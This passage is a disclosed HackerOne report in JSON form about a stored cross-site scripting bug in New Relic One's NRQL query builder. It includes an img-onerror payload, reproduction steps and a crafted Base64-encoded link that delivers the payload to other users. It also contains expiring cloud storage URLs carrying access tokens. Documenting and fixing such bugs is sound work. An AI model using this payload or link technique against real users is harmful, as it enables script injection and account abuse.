{"id":626082,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYwODI=","url":"https://hackerone.com/reports/626082","title":"Stored XSS via \"my recent queries\" selector in NRQL dashboard builder","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-06-22T22:59:28.333Z","submitted_at":"2019-06-22T22:59:28.333Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jon_bottarini","url":"/jon_bottarini","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-24T14:58:15.517Z","bug_reporter_agreed_on_going_public_at":"2020-08-20T02:38:04.095Z","team_member_agreed_on_going_public_at":"2020-08-24T14:58:15.380Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This is a pretty simple one. \n\nWithin NR One, there is a stored XSS via the dashboard builder. It appears in the \"My recent queries\" dropdown. You can attack other users with this bug by having them navigate to the link, I'll show an example below. \n\nSteps to Reproduce:\n1. From NR1, navigate to the chart builder\n2. Switch to NRQL mode\n3. Enter the following NRQL query in the search box: \n\n```SELECT `“\u003e\u003cimg src=x onerror=alert(document.domain)\u003e \"' Style=position` FROM SyntheticCheck```\n\n4. Press enter. \n5. Now, click on the \"My recent queries\" dropdown button. \n6. Payload will fire\n\n{F514924}\n\n## Impact\n\nIf you want to attack other users with this, you just need to send them the link to the payload in the address bar: \n\nhttps://one.newrelic.com/launcher/nr1-core.home#pane=eyJuZXJkbGV0SWQiOiJucjEtY29yZS5zZWFyY2gtcm9vdCJ9\u0026overlay=eyJvdmVybGF5SWQiOiJ3YW5kYS1kYXRhLWV4cGxvcmF0aW9uLm5ycWwtZWRpdG9yIiwibmVyZGxldElkIjoid2FuZGEtZGF0YS1leHBsb3JhdGlvbi5kYXRhLWV4cGxvcmVyIiwiaW5pdGlhbEFjdGl2ZUludGVyZmFjZSI6Im5ycWxFZGl0b3IiLCJpbml0aWFsTGltaXQiOjEwLCJpbml0aWFsVGltZVdpbmRvdyI6eyJzdGFydCI6bnVsbCwiZW5kIjoibm93Iiwib2Zmc2V0IjoxODAwMDAwfSwiaW5pdGlhbFRpbWVXaW5kb3dPdmVycmlkZSI6bnVsbCwiaW5pdGlhbEZpbHRlcnMiOiIiLCJpbml0aWFsUGxvdEFnZ3JlZ2F0ZSI6eyJwbG90Ijp7ImV2ZW50VHlwZXMiOlsiVHJhbnNhY3Rpb24iXSwiY2xhdXNlcyI6W3siYWxpYXMiOiJSZXNwb25zZSB0aW1lIiwibnJxbCI6IigodG90YWxUaW1lIE9SIGR1cmF0aW9uIE9SIDApICsgKHF1ZXVlRHVyYXRpb24gT1IgMCkgT1IgMCkgKiAxMDAwIn0seyJhbGlhcyI6IlJlcXVlc3QgcXVldWluZyIsIm5ycWwiOiIocXVldWVEdXJhdGlvbiBPUiAwKSAqIDEwMDAifSx7ImFsaWFzIjoiRXh0ZXJuYWxzIiwibnJxbCI6IihleHRlcm5hbER1cmF0aW9uIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJHQyIsIm5ycWwiOiIoZ2NDdW11bGF0aXZlIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJBcHBsaWNhdGlvbiB0aW1lIiwibnJxbCI6IigoKHRvdGFsVGltZSBPUiBkdXJhdGlvbiBPUiAwKSAtIChleHRlcm5hbER1cmF0aW9uIE9SIDApIC0gKGRhdGFiYXNlRHVyYXRpb24gT1IgMCkgLSAoZ2NDdW11bGF0aXZlIE9SIDApKSBPUiAwKSAqIDEwMDAifV0sInR5cGUiOiJzaG9ydGN1dCIsImxhYmVsIjoiVHJhbnNhY3Rpb24gdGltZSBicmVha2Rvd24iLCJzaG9ydGN1dE5hbWUiOiJhcG0udHJhbnNhY3Rpb25fdGltZV9icmVha2Rvd24ifSwiYWdncmVnYXRlIjoiYXZlcmFnZSJ9LCJpbml0aWFsQWNjb3VudElkIjoxNTIzOTM2LCJpbml0aWFsRmFjZXQiOm51bGwsImluaXRpYWxDb21wYXJlV2l0aCI6bnVsbCwiaW5pdGlhbENoYXJ0U2V0dGluZ3MiOnsiY2hhcnRUeXBlIjoiQ0hBUlRfVEFCTEUifSwiaW5pdGlhbE5ycWxWYWx1ZSI6IlNFTEVDVCBg4oCcPjxpbWcgc3JjPXggb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPiBcIicgU3R5bGU9cG9zaXRpb25gIEZST00gU3ludGhldGljQ2hlY2sifQ==\n\nThe reason this works is that `overlay=` parameter is Base64 encoded:\n\n```{\"overlayId\":\"wanda-data-exploration.nrql-editor\",\"nerdletId\":\"wanda-data-exploration.data-explorer\",\"initialActiveInterface\":\"nrqlEditor\",\"initialLimit\":10,\"initialTimeWindow\":{\"start\":null,\"end\":\"now\",\"offset\":1800000},\"initialTimeWindowOverride\":null,\"initialFilters\":\"\",\"initialPlotAggregate\":{\"plot\":{\"eventTypes\":[\"Transaction\"],\"clauses\":[{\"alias\":\"Response time\",\"nrql\":\"((totalTime OR duration OR 0) + (queueDuration OR 0) OR 0) * 1000\"},{\"alias\":\"Request queuing\",\"nrql\":\"(queueDuration OR 0) * 1000\"},{\"alias\":\"Externals\",\"nrql\":\"(externalDuration OR 0) * 1000\"},{\"alias\":\"GC\",\"nrql\":\"(gcCumulative OR 0) * 1000\"},{\"alias\":\"Application time\",\"nrql\":\"(((totalTime OR duration OR 0) - (externalDuration OR 0) - (databaseDuration OR 0) - (gcCumulative OR 0)) OR 0) * 1000\"}],\"type\":\"shortcut\",\"label\":\"Transaction time breakdown\",\"shortcutName\":\"apm.transaction_time_breakdown\"},\"aggregate\":\"average\"},\"initialAccountId\":1523936,\"initialFacet\":null,\"initialCompareWith\":null,\"initialChartSettings\":{\"chartType\":\"CHART_TABLE\"},\"initialNrqlValue\":\"SELECT `â\u003e\u003cimg src=x onerror=alert(document.domain)\u003e \\\"' Style=position` FROM SyntheticCheck\"}```\n\nWhich includes the payload in the request.","vulnerability_information_html":"\u003cp\u003eThis is a pretty simple one. \u003c/p\u003e\n\n\u003cp\u003eWithin NR One, there is a stored XSS via the dashboard builder. It appears in the \u0026quot;My recent queries\u0026quot; dropdown. You can attack other users with this bug by having them navigate to the link, I\u0026#39;ll show an example below. \u003c/p\u003e\n\n\u003cp\u003eSteps to Reproduce:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eFrom NR1, navigate to the chart builder\u003c/li\u003e\n\u003cli\u003eSwitch to NRQL mode\u003c/li\u003e\n\u003cli\u003eEnter the following NRQL query in the search box: \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003ccode\u003eSELECT `“\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; \u0026quot;\u0026#39; Style=position` FROM SyntheticCheck\u003c/code\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ePress enter. \u003c/li\u003e\n\u003cli\u003eNow, click on the \u0026quot;My recent queries\u0026quot; dropdown button. \u003c/li\u003e\n\u003cli\u003ePayload will fire\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2019-06-22_at_3.51.12_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/514/924/8faffe21fcb96d321ec06d9130e6094e5076ac19/Screen_Shot_2019-06-22_at_3.51.12_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-22_at_3.51.12_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-22_at_3.51.12_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063057Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=d6716bb0f24765811daa1a0cf7f916f8c4c647e44c5ec370017b6728faa2caa0\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/514/924/8faffe21fcb96d321ec06d9130e6094e5076ac19/Screen_Shot_2019-06-22_at_3.51.12_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-22_at_3.51.12_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-22_at_3.51.12_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063057Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=d6716bb0f24765811daa1a0cf7f916f8c4c647e44c5ec370017b6728faa2caa0\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIf you want to attack other users with this, you just need to send them the link to the payload in the address bar: \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://one.newrelic.com/launcher/nr1-core.home#pane=eyJuZXJkbGV0SWQiOiJucjEtY29yZS5zZWFyY2gtcm9vdCJ9\u0026amp;overlay=eyJvdmVybGF5SWQiOiJ3YW5kYS1kYXRhLWV4cGxvcmF0aW9uLm5ycWwtZWRpdG9yIiwibmVyZGxldElkIjoid2FuZGEtZGF0YS1leHBsb3JhdGlvbi5kYXRhLWV4cGxvcmVyIiwiaW5pdGlhbEFjdGl2ZUludGVyZmFjZSI6Im5ycWxFZGl0b3IiLCJpbml0aWFsTGltaXQiOjEwLCJpbml0aWFsVGltZVdpbmRvdyI6eyJzdGFydCI6bnVsbCwiZW5kIjoibm93Iiwib2Zmc2V0IjoxODAwMDAwfSwiaW5pdGlhbFRpbWVXaW5kb3dPdmVycmlkZSI6bnVsbCwiaW5pdGlhbEZpbHRlcnMiOiIiLCJpbml0aWFsUGxvdEFnZ3JlZ2F0ZSI6eyJwbG90Ijp7ImV2ZW50VHlwZXMiOlsiVHJhbnNhY3Rpb24iXSwiY2xhdXNlcyI6W3siYWxpYXMiOiJSZXNwb25zZSB0aW1lIiwibnJxbCI6IigodG90YWxUaW1lIE9SIGR1cmF0aW9uIE9SIDApICsgKHF1ZXVlRHVyYXRpb24gT1IgMCkgT1IgMCkgKiAxMDAwIn0seyJhbGlhcyI6IlJlcXVlc3QgcXVldWluZyIsIm5ycWwiOiIocXVldWVEdXJhdGlvbiBPUiAwKSAqIDEwMDAifSx7ImFsaWFzIjoiRXh0ZXJuYWxzIiwibnJxbCI6IihleHRlcm5hbER1cmF0aW9uIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJHQyIsIm5ycWwiOiIoZ2NDdW11bGF0aXZlIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJBcHBsaWNhdGlvbiB0aW1lIiwibnJxbCI6IigoKHRvdGFsVGltZSBPUiBkdXJhdGlvbiBPUiAwKSAtIChleHRlcm5hbER1cmF0aW9uIE9SIDApIC0gKGRhdGFiYXNlRHVyYXRpb24gT1IgMCkgLSAoZ2NDdW11bGF0aXZlIE9SIDApKSBPUiAwKSAqIDEwMDAifV0sInR5cGUiOiJzaG9ydGN1dCIsImxhYmVsIjoiVHJhbnNhY3Rpb24gdGltZSBicmVha2Rvd24iLCJzaG9ydGN1dE5hbWUiOiJhcG0udHJhbnNhY3Rpb25fdGltZV9icmVha2Rvd24ifSwiYWdncmVnYXRlIjoiYXZlcmFnZSJ9LCJpbml0aWFsQWNjb3VudElkIjoxNTIzOTM2LCJpbml0aWFsRmFjZXQiOm51bGwsImluaXRpYWxDb21wYXJlV2l0aCI6bnVsbCwiaW5pdGlhbENoYXJ0U2V0dGluZ3MiOnsiY2hhcnRUeXBlIjoiQ0hBUlRfVEFCTEUifSwiaW5pdGlhbE5ycWxWYWx1ZSI6IlNFTEVDVCBg4oCcPjxpbWcgc3JjPXggb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPiBcIicgU3R5bGU9cG9zaXRpb25gIEZST00gU3ludGhldGljQ2hlY2sifQ==\" href=\"/redirect?url=https%3A%2F%2Fone.newrelic.com%2Flauncher%2Fnr1-core.home%23pane%3DeyJuZXJkbGV0SWQiOiJucjEtY29yZS5zZWFyY2gtcm9vdCJ9%26overlay%3DeyJvdmVybGF5SWQiOiJ3YW5kYS1kYXRhLWV4cGxvcmF0aW9uLm5ycWwtZWRpdG9yIiwibmVyZGxldElkIjoid2FuZGEtZGF0YS1leHBsb3JhdGlvbi5kYXRhLWV4cGxvcmVyIiwiaW5pdGlhbEFjdGl2ZUludGVyZmFjZSI6Im5ycWxFZGl0b3IiLCJpbml0aWFsTGltaXQiOjEwLCJpbml0aWFsVGltZVdpbmRvdyI6eyJzdGFydCI6bnVsbCwiZW5kIjoibm93Iiwib2Zmc2V0IjoxODAwMDAwfSwiaW5pdGlhbFRpbWVXaW5kb3dPdmVycmlkZSI6bnVsbCwiaW5pdGlhbEZpbHRlcnMiOiIiLCJpbml0aWFsUGxvdEFnZ3JlZ2F0ZSI6eyJwbG90Ijp7ImV2ZW50VHlwZXMiOlsiVHJhbnNhY3Rpb24iXSwiY2xhdXNlcyI6W3siYWxpYXMiOiJSZXNwb25zZSB0aW1lIiwibnJxbCI6IigodG90YWxUaW1lIE9SIGR1cmF0aW9uIE9SIDApICsgKHF1ZXVlRHVyYXRpb24gT1IgMCkgT1IgMCkgKiAxMDAwIn0seyJhbGlhcyI6IlJlcXVlc3QgcXVldWluZyIsIm5ycWwiOiIocXVldWVEdXJhdGlvbiBPUiAwKSAqIDEwMDAifSx7ImFsaWFzIjoiRXh0ZXJuYWxzIiwibnJxbCI6IihleHRlcm5hbER1cmF0aW9uIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJHQyIsIm5ycWwiOiIoZ2NDdW11bGF0aXZlIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJBcHBsaWNhdGlvbiB0aW1lIiwibnJxbCI6IigoKHRvdGFsVGltZSBPUiBkdXJhdGlvbiBPUiAwKSAtIChleHRlcm5hbER1cmF0aW9uIE9SIDApIC0gKGRhdGFiYXNlRHVyYXRpb24gT1IgMCkgLSAoZ2NDdW11bGF0aXZlIE9SIDApKSBPUiAwKSAqIDEwMDAifV0sInR5cGUiOiJzaG9ydGN1dCIsImxhYmVsIjoiVHJhbnNhY3Rpb24gdGltZSBicmVha2Rvd24iLCJzaG9ydGN1dE5hbWUiOiJhcG0udHJhbnNhY3Rpb25fdGltZV9icmVha2Rvd24ifSwiYWdncmVnYXRlIjoiYXZlcmFnZSJ9LCJpbml0aWFsQWNjb3VudElkIjoxNTIzOTM2LCJpbml0aWFsRmFjZXQiOm51bGwsImluaXRpYWxDb21wYXJlV2l0aCI6bnVsbCwiaW5pdGlhbENoYXJ0U2V0dGluZ3MiOnsiY2hhcnRUeXBlIjoiQ0hBUlRfVEFCTEUifSwiaW5pdGlhbE5ycWxWYWx1ZSI6IlNFTEVDVCBg4oCcPjxpbWcgc3JjPXggb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPiBcIicgU3R5bGU9cG9zaXRpb25gIEZST00gU3ludGhldGljQ2hlY2sifQ%3D%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://one.newrelic.com/launcher/nr1-core.home#pane=eyJuZXJkbGV0SWQiOiJucjEtY29yZS5zZWFyY2gtcm9vdCJ9\u0026amp;overlay=eyJvdmVybGF5SWQiOiJ3YW5kYS1kYXRhLWV4cGxvcmF0aW9uLm5ycWwtZWRpdG9yIiwibmVyZGxldElkIjoid2FuZGEtZGF0YS1leHBsb3JhdGlvbi5kYXRhLWV4cGxvcmVyIiwiaW5pdGlhbEFjdGl2ZUludGVyZmFjZSI6Im5ycWxFZGl0b3IiLCJpbml0aWFsTGltaXQiOjEwLCJpbml0aWFsVGltZVdpbmRvdyI6eyJzdGFydCI6bnVsbCwiZW5kIjoibm93Iiwib2Zmc2V0IjoxODAwMDAwfSwiaW5pdGlhbFRpbWVXaW5kb3dPdmVycmlkZSI6bnVsbCwiaW5pdGlhbEZpbHRlcnMiOiIiLCJpbml0aWFsUGxvdEFnZ3JlZ2F0ZSI6eyJwbG90Ijp7ImV2ZW50VHlwZXMiOlsiVHJhbnNhY3Rpb24iXSwiY2xhdXNlcyI6W3siYWxpYXMiOiJSZXNwb25zZSB0aW1lIiwibnJxbCI6IigodG90YWxUaW1lIE9SIGR1cmF0aW9uIE9SIDApICsgKHF1ZXVlRHVyYXRpb24gT1IgMCkgT1IgMCkgKiAxMDAwIn0seyJhbGlhcyI6IlJlcXVlc3QgcXVldWluZyIsIm5ycWwiOiIocXVldWVEdXJhdGlvbiBPUiAwKSAqIDEwMDAifSx7ImFsaWFzIjoiRXh0ZXJuYWxzIiwibnJxbCI6IihleHRlcm5hbER1cmF0aW9uIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJHQyIsIm5ycWwiOiIoZ2NDdW11bGF0aXZlIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJBcHBsaWNhdGlvbiB0aW1lIiwibnJxbCI6IigoKHRvdGFsVGltZSBPUiBkdXJhdGlvbiBPUiAwKSAtIChleHRlcm5hbER1cmF0aW9uIE9SIDApIC0gKGRhdGFiYXNlRHVyYXRpb24gT1IgMCkgLSAoZ2NDdW11bGF0aXZlIE9SIDApKSBPUiAwKSAqIDEwMDAifV0sInR5cGUiOiJzaG9ydGN1dCIsImxhYmVsIjoiVHJhbnNhY3Rpb24gdGltZSBicmVha2Rvd24iLCJzaG9ydGN1dE5hbWUiOiJhcG0udHJhbnNhY3Rpb25fdGltZV9icmVha2Rvd24ifSwiYWdncmVnYXRlIjoiYXZlcmFnZSJ9LCJpbml0aWFsQWNjb3VudElkIjoxNTIzOTM2LCJpbml0aWFsRmFjZXQiOm51bGwsImluaXRpYWxDb21wYXJlV2l0aCI6bnVsbCwiaW5pdGlhbENoYXJ0U2V0dGluZ3MiOnsiY2hhcnRUeXBlIjoiQ0hBUlRfVEFCTEUifSwiaW5pdGlhbE5ycWxWYWx1ZSI6IlNFTEVDVCBg4oCcPjxpbWcgc3JjPXggb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPiBcIicgU3R5bGU9cG9zaXRpb25gIEZST00gU3ludGhldGljQ2hlY2sifQ==\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe reason this works is that \u003ccode\u003eoverlay=\u003c/code\u003e parameter is Base64 encoded:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e{\u0026quot;overlayId\u0026quot;:\u0026quot;wanda-data-exploration.nrql-editor\u0026quot;,\u0026quot;nerdletId\u0026quot;:\u0026quot;wanda-data-exploration.data-explorer\u0026quot;,\u0026quot;initialActiveInterface\u0026quot;:\u0026quot;nrqlEditor\u0026quot;,\u0026quot;initialLimit\u0026quot;:10,\u0026quot;initialTimeWindow\u0026quot;:{\u0026quot;start\u0026quot;:null,\u0026quot;end\u0026quot;:\u0026quot;now\u0026quot;,\u0026quot;offset\u0026quot;:1800000},\u0026quot;initialTimeWindowOverride\u0026quot;:null,\u0026quot;initialFilters\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;initialPlotAggregate\u0026quot;:{\u0026quot;plot\u0026quot;:{\u0026quot;eventTypes\u0026quot;:[\u0026quot;Transaction\u0026quot;],\u0026quot;clauses\u0026quot;:[{\u0026quot;alias\u0026quot;:\u0026quot;Response time\u0026quot;,\u0026quot;nrql\u0026quot;:\u0026quot;((totalTime OR duration OR 0) + (queueDuration OR 0) OR 0) * 1000\u0026quot;},{\u0026quot;alias\u0026quot;:\u0026quot;Request queuing\u0026quot;,\u0026quot;nrql\u0026quot;:\u0026quot;(queueDuration OR 0) * 1000\u0026quot;},{\u0026quot;alias\u0026quot;:\u0026quot;Externals\u0026quot;,\u0026quot;nrql\u0026quot;:\u0026quot;(externalDuration OR 0) * 1000\u0026quot;},{\u0026quot;alias\u0026quot;:\u0026quot;GC\u0026quot;,\u0026quot;nrql\u0026quot;:\u0026quot;(gcCumulative OR 0) * 1000\u0026quot;},{\u0026quot;alias\u0026quot;:\u0026quot;Application time\u0026quot;,\u0026quot;nrql\u0026quot;:\u0026quot;(((totalTime OR duration OR 0) - (externalDuration OR 0) - (databaseDuration OR 0) - (gcCumulative OR 0)) OR 0) * 1000\u0026quot;}],\u0026quot;type\u0026quot;:\u0026quot;shortcut\u0026quot;,\u0026quot;label\u0026quot;:\u0026quot;Transaction time breakdown\u0026quot;,\u0026quot;shortcutName\u0026quot;:\u0026quot;apm.transaction_time_breakdown\u0026quot;},\u0026quot;aggregate\u0026quot;:\u0026quot;average\u0026quot;},\u0026quot;initialAccountId\u0026quot;:1523936,\u0026quot;initialFacet\u0026quot;:null,\u0026quot;initialCompareWith\u0026quot;:null,\u0026quot;initialChartSettings\u0026quot;:{\u0026quot;chartType\u0026quot;:\u0026quot;CHART_TABLE\u0026quot;},\u0026quot;initialNrqlValue\u0026quot;:\u0026quot;SELECT `â\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; \\\u0026quot;\u0026#39; Style=position` FROM SyntheticCheck\u0026quot;}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eWhich includes the payload in the request.\u003c/p\u003e\n","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":514924,"file_name":"Screen_Shot_2019-06-22_at_3.51.12_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/514/924/8faffe21fcb96d321ec06d9130e6094e5076ac19/Screen_Shot_2019-06-22_at_3.51.12_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-22_at_3.51.12_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-22_at_3.51.12_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063057Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9